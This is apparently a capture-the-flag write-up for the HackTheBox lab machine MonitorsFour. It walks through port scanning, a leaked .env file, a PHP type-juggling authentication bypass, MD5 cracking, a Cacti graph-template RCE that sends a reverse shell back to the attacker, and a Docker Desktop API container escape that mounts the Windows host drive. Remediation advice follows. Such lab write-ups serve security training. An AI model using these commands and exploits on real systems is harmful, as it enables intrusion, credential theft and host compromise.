# MonitorsFour - HackTheBox Machine Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Release Date](https://img.shields.io/badge/Release%20Date-2025-green)

## Table of Contents
1. [Machine Information](#machine-information)
2. [Network Architecture](#network-architecture)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
   - [Web Application Discovery](#web-application-discovery)
   - [Subdomain Enumeration](#subdomain-enumeration)
   - [Exposed Configuration Files](#exposed-configuration-files)
5. [Initial Access - Type Juggling Authentication Bypass](#initial-access---type-juggling-authentication-bypass)
   - [Understanding PHP Type Juggling](#understanding-php-type-juggling)
   - [Exploiting the Vulnerability](#exploiting-the-vulnerability)
   - [Password Cracking](#password-cracking)
6. [Cacti Exploitation](#cacti-exploitation)
   - [CVE-2025-24367 - Authenticated RCE](#cve-2025-24367---authenticated-rce)
7. [Container Environment Discovery](#container-environment-discovery)
8. [Privilege Escalation - Docker Escape](#privilege-escalation---docker-escape)
   - [CVE-2025-9074 - Docker Desktop API Exposure](#cve-2025-9074---docker-desktop-api-exposure)
   - [Mounting Host Filesystem](#mounting-host-filesystem)
9. [Flags](#flags)
10. [Key Takeaways](#key-takeaways)
11. [Remediation](#remediation)
12. [Tools Used](#tools-used)
13. [References](#references)
## Machine Information
- **Machine Name:** MonitorsFour
- **IP Address:** 10.129.10.91
- **Operating System:** Windows (WSL2 with Docker)
- **Difficulty:** Medium
- **Attack Vector:** Web Application → PHP Type Juggling → Container Escape
- **Privilege Escalation:** Docker API Exploitation (CVE-2025-9074)
## Network Architecture
Understanding the network topology is crucial for this machine. Here's the complete architecture:
```
┌─────────────────────────────────────────────────────────────────┐
│                        Internet / HTB VPN                        │
│                                                                  │
│  [Your Kali Machine]                                            │
│  IP: 10.10.15.220                                               │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             │ Port 80 (HTTP)
                             │ Port 5985 (WinRM)
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Windows Host (Target)                         │
│                    IP: 10.129.10.91 (External)                  │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │              WSL2 Virtual Machine                          │ │
│  │              Kernel: 6.6.87.2-microsoft-standard-WSL2     │ │
│  │                                                            │ │
│  │  ┌─────────────────────────────────────────────────────┐ │ │
│  │  │         Docker Engine                                │ │ │
│  │  │         API: 192.168.65.7:2375 (CVE-2025-9074!)     │ │ │
│  │  │                                                      │ │ │
│  │  │  Docker Network: 172.18.0.0/16                      │ │ │
│  │  │  ┌───────────────────────────────────────────────┐ │ │ │
│  │  │  │  Gateway: 172.18.0.1                          │ │ │ │
│  │  │  │                                               │ │ │ │
│  │  │  │  ┌────────────────────────────────────────┐ │ │ │ │
│  │  │  │  │ Container: MariaDB                     │ │ │ │ │
│  │  │  │  │ IP: 172.18.0.2                         │ │ │ │ │
│  │  │  │  │ Port: 3306                             │ │ │ │ │
│  │  │  │  │ DB: monitorsfour_db                    │ │ │ │ │
│  │  │  │  └────────────────────────────────────────┘ │ │ │ │
│  │  │  │                                               │ │ │ │
│  │  │  │  ┌────────────────────────────────────────┐ │ │ │ │
│  │  │  │  │ Container: Cacti + MonitorsFour Web   │ │ │ │ │
│  │  │  │  │ IP: 172.18.0.3                         │ │ │ │ │
│  │  │  │  │ Port: 80 (nginx)                       │ │ │ │ │
│  │  │  │  │ Port: 9000 (PHP-FPM)                   │ │ │ │ │
│  │  │  │  │ ▶ Initial Shell Here (www-data)        │ │ │ │ │
│  │  │  │  └────────────────────────────────────────┘ │ │ │ │
│  │  │  └───────────────────────────────────────────────┘ │ │ │
│  │  └─────────────────────────────────────────────────────┘ │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Windows Filesystem: C:\                                        │
│  Mounted in WSL2 as: /mnt/host/c                               │
│  Root Flag: C:\Users\Administrator\Desktop\root.txt            │
└─────────────────────────────────────────────────────────────────┘
```
### **Key IP Addresses:**
| Location | IP Address | Description |
|----------|------------|-------------|
| **External** | 10.129.10.91 | Windows host (HTB network) |
| **Your Kali** | 10.10.15.220 | Attacking machine (VPN) |
| **Docker Gateway** | 172.18.0.1 | Container network gateway |
| **MariaDB Container** | 172.18.0.2 | Database server |
| **Web Container** | 172.18.0.3 | Cacti + MonitorsFour app |
| **Docker Host API** | 192.168.65.7:2375 | **CVE-2025-9074 (Critical!)** |
## Reconnaissance
### **Initial Port Scan**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn 10.129.10.91 -oN nmap_scan.txt
```
**Breaking down this command:**
- `-p-` : Scan all 65,535 ports
- `--min-rate=10000` : Send at least 10,000 packets per second (faster scanning)
- `-T5` : Aggressive timing template (fastest)
- `-sCV` : Combined flag for `-sC` (default scripts) and `-sV` (version detection)
- `-Pn` : Skip host discovery (treat host as online)
- `-oN nmap_scan.txt` : Save output in normal format
**Results:**
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
**Analysis:**
- **Port 80 (HTTP):** nginx web server redirecting to `monitorsfour.htb` domain
- **Port 5985 (WinRM):** Windows Remote Management - will need credentials
- **No SMB, RDP, or Active Directory services** - This is NOT a domain controller
- **This appears to be a standalone Windows web server**
### **UDP Scan**
```bash
sudo nmap -sU --top-ports 1000 --min-rate 5000 -Pn 10.129.10.91 -oN nmap_udp.txt
```
**What is a UDP scan?**
UDP (User Datagram Protocol) is a connectionless protocol, unlike TCP. Some services run on UDP:
- DNS (53)
- DHCP (67/68)
- SNMP (161/162)
- NTP (123)
**Why scan UDP?**
Many penetration testers skip UDP scans because they're slower and less reliable, but important services can be missed.
**Results:**
```
All 1000 scanned ports are in ignored states (open|filtered)
```
No interesting UDP ports discovered.
## Enumeration
### **Add Hostname to /etc/hosts**
Since the web server redirects to `monitorsfour.htb`, we need to add this to our hosts file:
```bash
echo "10.129.10.91 monitorsfour.htb" | sudo tee -a /etc/hosts
```
**Why do we need /etc/hosts?**
When you type a domain name in your browser, your computer needs to translate it to an IP address. Normally, this is done via DNS servers, but we can override this locally using `/etc/hosts`. This file maps hostnames to IP addresses before any DNS lookup occurs.
**Format:** `IP_ADDRESS    HOSTNAME`
### **Web Application Discovery**
```bash
# Directory enumeration
gobuster dir -u http://monitorsfour.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o gobuster.txt
```
**What is Gobuster?**
Gobuster is a directory/file brute-forcing tool. It sends HTTP requests for common directory and file names to discover hidden resources on a web server.
**Gobuster Results:**
```
/contact              (Status: 200) [Size: 367]
/login                (Status: 200) [Size: 4340]
/user                 (Status: 200) [Size: 35]
/static               (Status: 301)
/views                (Status: 301)
/forgot-password      (Status: 200) [Size: 3099]
/controllers          (Status: 301)
```
**Key Observations:**
- `/login` - Login page (4340 bytes - full page)
- `/user` - Returns small response (35 bytes) - likely an API endpoint
- `/controllers/` - Might expose source code
- `/api/v1/auth` - API authentication endpoint (found during manual testing)
### **Subdomain Enumeration**
**Why check for subdomains?**
Modern web applications often use subdomains for different services:
- `admin.example.com` - Administrative interface
- `api.example.com` - API endpoints
- `dev.example.com` - Development/staging environment
These subdomains might have different security configurations or expose additional attack surface.
**Command:**
```bash
ffuf -c \
  -u http://monitorsfour.htb/ \
  -H "Host: FUZZ.monitorsfour.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fw 3 \
  -o ffuf_subdomains.txt
```
**Breaking down this command:**
- `ffuf` - Fast web fuzzer (Fuzz Faster U Fool)
- `-c` - Colorized output
- `-u` - Target URL
- `-H "Host: FUZZ.monitorsfour.htb"` - Inject fuzzing into Host header (virtual host enumeration)
- `-w` - Wordlist with 110,000 common subdomains
- `-fw 3` - **Filter by word count = 3** (removes false positives with same response size)
- `FUZZ` - Placeholder that gets replaced with each wordlist entry
**Why `-fw 3`?**
When fuzzing virtual hosts, most non-existent subdomains return the same default page. By filtering responses with 3 words, we eliminate this noise and only see unique responses (actual subdomains).
**Result:**
```
cacti                   [Status: 200, Size: 1234, Words: 156, Lines: 42]
```
**Found subdomain: `cacti.monitorsfour.htb`!**
```bash
echo "10.129.10.91 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```
### **Exposed Configuration Files**
**What is Nuclei?**
Nuclei is a vulnerability scanner that uses templates to detect security issues. It can check for:
- Exposed configuration files
- Known CVEs
- Misconfigurations
- Information disclosure
**Command:**
```bash
nuclei -u http://monitorsfour.htb -o nuclei_scan.txt
```
**Critical Finding:**
```
[generic-env] [http] [high] http://monitorsfour.htb/.env
```
**What is a .env file?**
The `.env` file is used by modern web frameworks (Laravel, CodeIgniter, Node.js, etc.) to store environment-specific configuration:
- Database credentials
- API keys
- Secret tokens
- Application settings
**This file should NEVER be publicly accessible!**
**Retrieve the file:**
```bash
curl http://monitorsfour.htb/.env
```
**Contents:**
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
**What we learned:**
- Database is MariaDB
- Database name: `monitorsfour_db`
- Username: `monitorsdbuser`
- Password: `f37p2j8f4t0r`
- Host is "mariadb" - suggests Docker container networking
## Initial Access - Type Juggling Authentication Bypass
### **Understanding PHP Type Juggling**
**What is Type Juggling?**
PHP has two types of comparison operators:
1. **Loose Comparison (`==`)** - Compares values after type conversion
2. **Strict Comparison (`===`)** - Compares values AND types (no conversion)
**Example of the vulnerability:**
```php
// Vulnerable code (loose comparison)
$token = $_GET['token'];
$valid_token = "abc123def456";
if ($token == $valid_token) {
    // Grant access
}
```
**The Problem:**
PHP automatically converts types during loose comparison, leading to unexpected behavior:
```php
"0" == 0           // TRUE  (string "0" converts to integer 0)
"abc" == 0         // TRUE  (non-numeric string converts to 0)
"0e12345" == "0e67890"  // TRUE  (scientific notation: 0 * 10^12345 = 0)
true == 1          // TRUE  (boolean true converts to 1)
false == 0         // TRUE  (boolean false converts to 0)
null == 0          // TRUE  (null converts to 0)
```
**Magic Hashes:**
When MD5/SHA1 hashes start with "0e" followed only by digits, PHP treats them as scientific notation:
```php
md5("240610708") = "0e462097431906509019562988736854"
// PHP sees: 0 * 10^462097431906509019562988736854 = 0
md5("QNKCDZO") = "0e830400451993494058024219903391"
// PHP sees: 0 * 10^830400451993494058024219903391 = 0
// So these hashes "equal" each other:
"0e462097431906509019562988736854" == "0e830400451993494058024219903391"  // TRUE!
```
### **Discovering the Vulnerability**
**Testing the /user endpoint:**
```bash
curl "http://monitorsfour.htb/user?token=test"
```
**Response:**
```json
{"error":"Missing token parameter"}
```
Okay, it requires a token. Let's test type juggling:
```bash
# Test with integer 0
curl "http://monitorsfour.htb/user?token=0"
```
**Response:**
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  }
]
```
**🎉 SUCCESS! We bypassed authentication!**
**Why did this work?**
The backend code likely does:
```php
$token = $_GET['token'];
$valid_tokens = ["0e543210987654321", "0e999999999999999", ...];
foreach ($valid_tokens as $valid) {
    if ($token == $valid) {  // LOOSE COMPARISON!
        return user_data();
    }
}
```
Since valid tokens start with "0e", and we sent "0", PHP converts both to 0:
```php
0 == "0e543210987654321"  // TRUE (both become 0)
```
### **Exploiting the Vulnerability**
**Manual testing:**
```bash
# Test that worked
curl "http://monitorsfour.htb/user?token=0"
# Also works
curl "http://monitorsfour.htb/user?token=0e1"
curl "http://monitorsfour.htb/user?token=0e215962017"
```
**All return full user data including password hashes!**
### **Extracted User Data**
```json
{
  "id": 2,
  "username": "admin",
  "email": "admin@monitorsfour.htb",
  "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
  "role": "super user",
  "token": "8024b78f83f102da4f",
  "name": "Marcus Higgins"
}
```
**Additional users discovered:**
- `mwatson` - password hash: `69196959c16b26ef00b77d82cf6eb169`
- `janderson` - password hash: `2a22dcf99190c322d974c8df5ba3256b`
- `dthompson` - password hash: `8d4a7e7fd08555133e056d9aacb1e519`
### **Password Cracking**
**Save hashes to file:**
```bash
cat > hashes.txt << EOF
56b32eb43e6f15395f6c46c1c9e1cd36
69196959c16b26ef00b77d82cf6eb169
2a22dcf99190c322d974c8df5ba3256b
8d4a7e7fd08555133e056d9aacb1e519
EOF
```
**What is MD5?**
MD5 (Message Digest Algorithm 5) is a cryptographic hash function that produces a 128-bit (32 hexadecimal characters) hash value. It's designed to be one-way (irreversible), but:
- **Vulnerable to collisions** - Two different inputs can produce the same hash
- **Fast to compute** - Makes brute-force attacks feasible
- **Rainbow tables exist** - Pre-computed tables of hash:password pairs
**Modern password hashing should use:**
- bcrypt
- scrypt
- Argon2
- PBKDF2
**Crack with Hashcat:**
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
**Breaking down this command:**
- `hashcat` - Password cracking tool (GPU-accelerated)
- `-m 0` - Hash type 0 = MD5
- `hashes.txt` - File containing hashes to crack
- `/usr/share/wordlists/rockyou.txt` - Wordlist with 14 million common passwords
- `-o cracked.txt` - Output file for cracked passwords
**How does hashcat work?**
Hashcat takes each word from the wordlist, hashes it with MD5, and compares it to the target hash:
```
rockyou.txt word → MD5 → Compare to target hash
"password123" → MD5 → 482c811da5d5b4bc6d497ffa98491e38
"wonderful1" → MD5 → 56b32eb43e6f15395f6c46c1c9e1cd36 ← MATCH!
```
**Result:**
```
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
```
**Credentials found:**
- **Username:** `admin` (or `marcus` for some services)
- **Password:** `wonderful1`
## Cacti Exploitation
### **What is Cacti?**
Cacti is an open-source network monitoring and graphing tool that:
- Monitors network devices via SNMP
- Creates performance graphs (RRDtool)
- Provides web-based interface for managing monitoring
- Commonly used in enterprise environments
**Technology stack:**
- PHP-based web application
- MySQL/MariaDB database
- RRDtool for data storage
- Web server (Apache/nginx)
### **Accessing Cacti**
**URL:** `http://cacti.monitorsfour.htb/cacti/`
**Login attempts:**
```bash
# Try admin:wonderful1
# ❌ Failed
# Try marcus:wonderful1
# ✅ SUCCESS!
```
**Why did "marcus" work instead of "admin"?**
Remember from the user data, the full name was "Marcus Higgins". The Cacti login uses the first name as username, not "admin".
### **CVE-2025-24367 - Authenticated Graph Template RCE**
**Vulnerability Details:**
This CVE allows authenticated users to execute arbitrary code on the server through Cacti's graph template import functionality.
**How does it work?**
1. Attacker creates a malicious graph template
2. Template contains PHP code in template fields
3. When template is imported, PHP code is written to a file
4. Attacker accesses the file to trigger code execution
**Exploit:**
```bash
# Clone the exploit
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
# Install requirements
pip3 install requests beautifulsoup4
# Modify the exploit to use port 8888 instead of 80 (non-root)
sed -i 's/BackgroundHTTPServer(os.getcwd(), 80)/BackgroundHTTPServer(os.getcwd(), 8888)/' exploit.py
# Set up listener
nc -lvnp 4444
# Run exploit (in another terminal)
python3 exploit.py \
  -u marcus \
  -p wonderful1 \
  -i 10.10.15.220 \
  -l 4444 \
  -url http://cacti.monitorsfour.htb/cacti
```
**What does this exploit do?**
1. **Authenticates** to Cacti with marcus:wonderful1
2. **Creates** a malicious graph template containing a PHP reverse shell
3. **Uploads** the template through the import functionality
4. **Triggers** the PHP code execution
5. **Connects back** to your listener with a shell
**Connection received:**
```
listening on [any] 4444 ...
connect to [10.10.15.220] from (UNKNOWN) [10.129.10.91] 62887
www-data@821fbd6a43fa:~/html/cacti$
```
**We got a shell as `www-data` user!**
### **User Flag**
```bash
# Check current user
whoami
# www-data
# Navigate to marcus home directory
cd /home/marcus
ls -la
# Read user flag
cat user.txt
```
**User Flag:** `315af94735003fb88065a1fb7459078f`
## Container Environment Discovery
### **Basic Enumeration**
```bash
# Who are we?
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# What OS?
uname -a
# Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 ...
```
**Key observations:**
1. **Hostname:** `821fbd6a43fa` - This is a Docker container ID!
2. **Kernel:** `microsoft-standard-WSL2` - Running on Windows with WSL2
3. **User:** `www-data` - Web server user with limited privileges
### **Docker Detection**
```bash
# Check for .dockerenv file (exists in Docker containers)
ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 Nov 10 17:04 /.dockerenv
# Check cgroups (control groups used by containers)
cat /proc/1/cgroup
# 0::/
# Check network configuration
ip addr show
# eth0: 172.18.0.3/16
ip route
# default via 172.18.0.1 dev eth0
# 172.18.0.0/16 dev eth0 scope link src 172.18.0.3
```
**Confirmed: We're inside a Docker container!**
### **Network Analysis**
```bash
# Check listening ports
netstat -tulnp
# tcp   LISTEN  0.0.0.0:80         (nginx)
# tcp   LISTEN  *:9000             (PHP-FPM)
# Check DNS configuration
cat /etc/resolv.conf
# nameserver 127.0.0.11
# # ExtServers: [host(192.168.65.7)]
```
**Critical discovery:** Docker host IP is `192.168.65.7`!
**What does this mean?**
- `127.0.0.11` - Docker's internal DNS server
- `192.168.65.7` - The actual Docker host (Windows machine running Docker Desktop)
- This IP is crucial for the privilege escalation
### **Network Scanning from Container**
**Comprehensive port scan:**
```bash
PORTS="22 80 443 2375 2376 3306 5985 8080 9000"
for network in "172.18.0" "192.168.65"; do
  echo "Scanning $network.0/24..."
  for i in {1..10}; do
    for port in $PORTS; do
      timeout 1 bash -c "echo > /dev/tcp/$network.$i/$port 2>/dev/null" && \
      echo "[+] $network.$i:$port OPEN"
    done
  done
done
```
**Results:**
```
[+] 172.18.0.1:80 OPEN      (Gateway)
[+] 172.18.0.1:3306 OPEN    (MySQL)
[+] 172.18.0.2:3306 OPEN    (MariaDB container)
[+] 172.18.0.3:80 OPEN      (Cacti - we're here)
[+] 172.18.0.3:9000 OPEN    (PHP-FPM)
[+] 192.168.65.7:2375 OPEN  (Docker API - CRITICAL!)
```
**Critical finding:** `192.168.65.7:2375` - **This is the Docker API port - our ticket to escaping the container!**
## Privilege Escalation - Docker Escape
### **CVE-2025-9074 - Docker Desktop API Exposure**
**What is CVE-2025-9074?**
This is a **critical vulnerability** (CVSS 9.3) in Docker Desktop for Windows and macOS that exposes the Docker Engine API on the internal network without authentication.
**Affected versions:**
- Docker Desktop for Windows < 4.44.3
- Docker Desktop for Mac < 4.44.3
- Linux versions NOT affected (different architecture)
**Why is this critical?**
The Docker API at port 2375 provides **full control** over the Docker daemon:
- Create new containers
- Mount host filesystem
- Execute commands with elevated privileges
- Read/write any file on the host system
**In simpler terms:** If you can reach port 2375 from inside a container, you can escape to the host.
### **Verifying API Access**
```bash
# Test connection to Docker API
curl -s http://192.168.65.7:2375/version
```
**Response:**
```json
{
  "Platform": {"Name": "Docker Engine - Community"},
  "Components": [
    {"Name": "Engine", "Version": "28.3.2"}
  ],
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "Os": "linux",
  "Arch": "amd64",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2"
}
```
**API is accessible and responding! ✅**
### **Understanding Docker's Architecture**
Before exploiting, let's understand how Docker works:
```
┌─────────────────────────────────────────┐
│         Docker Client (CLI)             │
│         docker run, docker exec         │
└────────────────┬────────────────────────┘
                 │ HTTP/REST API
                 ▼
┌─────────────────────────────────────────┐
│         Docker Daemon (Engine)          │
│         Manages containers/images       │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│         containerd                      │
│         Container runtime               │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│         runc                            │
│         Creates container processes     │
└─────────────────────────────────────────┘
```
**The Docker API provides the same capabilities as the `docker` command-line tool.**
When we send requests to port 2375, we're essentially running docker commands remotely.
### **Listing Containers and Images**
```bash
# List running containers
curl -s http://192.168.65.7:2375/containers/json?all=true
```
**Images available:**
- `docker_setup-nginx-php:latest` (1.2 GB)
- `docker_setup-mariadb:latest` (454 MB)
- `alpine:latest` (12.7 MB)
### **Mounting Host Filesystem**
**The Attack Plan:**
1. Create a new container using an available image
2. Mount the Windows host filesystem into the container
3. Execute commands to read/write host files
4. Read the root flag from `C:\Users\Administrator\Desktop\root.txt`
**Key insight:** In WSL2 Docker, the Windows C: drive is mounted at `/mnt/host/c`
**Why does this work?**
When we create a container with the Docker API, we can specify **volume mounts** (binds) that map host directories into the container. Docker runs with elevated privileges, so it can access any part of the host filesystem.
**Create malicious container:**
```bash
curl -H 'Content-Type: application/json' \
  -d '{
    "Image": "docker_setup-nginx-php:latest",
    "Cmd": ["/bin/bash","-c","cat /host_root/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }' \
  http://192.168.65.7:2375/containers/create
```
**Breaking down this JSON payload:**
```json
{
  "Image": "docker_setup-nginx-php:latest",  // Use existing image
  "Cmd": [                                    // Command to run
    "/bin/bash","-c",                        // Execute bash command
    "cat /host_root/Users/Administrator/Desktop/root.txt"  // Read flag
  ],
  "HostConfig": {
    "Binds": [                               // Volume mounts
      "/mnt/host/c:/host_root"               // Mount C: to /host_root
    ]
  }
}
```
**What happens:**
1. Docker creates a new container from the nginx-php image
2. Mounts Windows `C:\` (accessed as `/mnt/host/c` in WSL2) to `/host_root` inside container
3. Runs the command to read the root flag
4. Container executes and exits
**Response:**
```json
{"Id":"8253b2da74c465328a1b0b53ffed6d8799304d4e87ced08ec7f39e4e89986c01"}
```
**Start the container:**
```bash
curl -X POST http://192.168.65.7:2375/containers/8253b2da74c465328a1b0b53ffed6d8799304d4e87ced08ec7f39e4e89986c01/start
```
**Retrieve the output:**
```bash
sleep 2  # Wait for command to complete
curl -s "http://192.168.65.7:2375/containers/8253b2da74c465328a1b0b53ffed6d8799304d4e87ced08ec7f39e4e89986c01/logs?stdout=true&stderr=true"
```
**Output:**
```
6965591f8d5bd231ff1e3622280fd310
```
**Root Flag captured! 🎉**
## Flags
### **User Flag**
**Location:** `/home/marcus/user.txt` (inside Cacti container)
**Flag:** `315af94735003fb88065a1fb7459078f`
**How obtained:** Initial shell as `www-data` through Cacti CVE-2025-24367 exploit
### **Root Flag**
**Location:** `C:\Users\Administrator\Desktop\root.txt` (Windows host)
**Flag:** `6965591f8d5bd231ff1e3622280fd310`
**How obtained:** Docker container escape via CVE-2025-9074, mounted host filesystem
## Key Takeaways
### **Vulnerabilities Exploited**
1. **Information Disclosure (.env file exposure)**
   - Severity: High
   - Impact: Database credentials leaked
2. **PHP Type Juggling (Loose Comparison)**
   - Severity: Critical
   - Impact: Authentication bypass, user data exposure
3. **Weak Password Hashing (MD5)**
   - Severity: Medium
   - Impact: Passwords easily cracked
4. **CVE-2025-24367 (Cacti Authenticated RCE)**
   - Severity: Critical
   - Impact: Remote code execution, initial access
5. **CVE-2025-9074 (Docker Desktop API Exposure)**
   - Severity: Critical (CVSS 9.3)
   - Impact: Container escape, full host compromise
### **Attack Chain Summary**
```
1. Nmap Scan
   ↓
2. Found HTTP on port 80
   ↓
3. Discovered subdomain: cacti.monitorsfour.htb
   ↓
4. Found exposed .env file (DB credentials)
   ↓
5. PHP Type Juggling bypass on /user endpoint
   ↓
6. Extracted user data including MD5 hashes
   ↓
7. Cracked admin password: wonderful1
   ↓
8. Logged into Cacti as marcus:wonderful1
   ↓
9. Exploited CVE-2025-24367 for RCE
   ↓
10. Got shell as www-data in Docker container
   ↓
11. USER FLAG CAPTURED
   ↓
12. Discovered Docker API at 192.168.65.7:2375
   ↓
13. Exploited CVE-2025-9074 to escape container
   ↓
14. Mounted Windows host filesystem
   ↓
15. ROOT FLAG CAPTURED
```
## Remediation
### **Fixing PHP Type Juggling**
**Vulnerable code:**
```php
$token = $_GET['token'];
if ($token == $user['token']) {  // ❌ LOOSE COMPARISON
    return $user;
}
```
**Secure code:**
```php
$token = $_GET['token'];
// Validate input type
if (!is_string($token) || empty($token)) {
    return error("Invalid token");
}
// Use strict comparison
if ($token === $user['token']) {  // ✅ STRICT COMPARISON
    return $user;
}
// Even better - use constant-time comparison
if (hash_equals($token, $user['token'])) {  // ✅ PREVENTS TIMING ATTACKS
    return $user;
}
```
### **Securing .env Files**
**Add to .gitignore:**
```bash
echo ".env" >> .gitignore
echo ".env.*" >> .gitignore
git rm --cached .env  # Remove if already committed
```
**Web server configuration (nginx):**
```nginx
location ~ /\.env {
    deny all;
    return 404;
}
```
### **Fixing CVE-2025-9074**
**Update Docker Desktop:**
```bash
# Windows: Download latest version from docker.com
# macOS: brew upgrade --cask docker
# Verify version
docker --version  # Should be >= 4.44.3
```
## Tools Used
| Tool | Purpose | Command |
|------|---------|---------|
| **nmap** | Port scanning | `nmap -p- -sCV -Pn 10.129.10.91` |
| **ffuf** | Subdomain enumeration | `ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb"` |
| **nuclei** | Vulnerability scanning | `nuclei -u http://monitorsfour.htb` |
| **curl** | HTTP requests | `curl http://monitorsfour.htb/.env` |
| **hashcat** | Password cracking | `hashcat -m 0 hashes.txt rockyou.txt` |
| **netcat** | Reverse shell listener | `nc -lvnp 4444` |
## References
### **CVEs**
- [CVE-2025-24367 - Cacti Authenticated RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)
- [CVE-2025-9074 - Docker Desktop API Exposure](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
### **Exploits**
- [CVE-2025-24367 PoC by TheCyberGeek](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
- [CVE-2025-9074 PoC by xwpdx0](https://github.com/xwpdx0/poc-2025-9074)
### **Documentation**
- [Docker Engine API Documentation](https://docs.docker.com/engine/api/)
- [PHP Type Juggling Vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Type_Juggling)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

---

**Skills learned:**
- PHP Type Juggling exploitation
- Docker container escape techniques
- CVE exploitation (Cacti, Docker)
- Network enumeration in containerized environments
- Windows/Linux hybrid system navigation
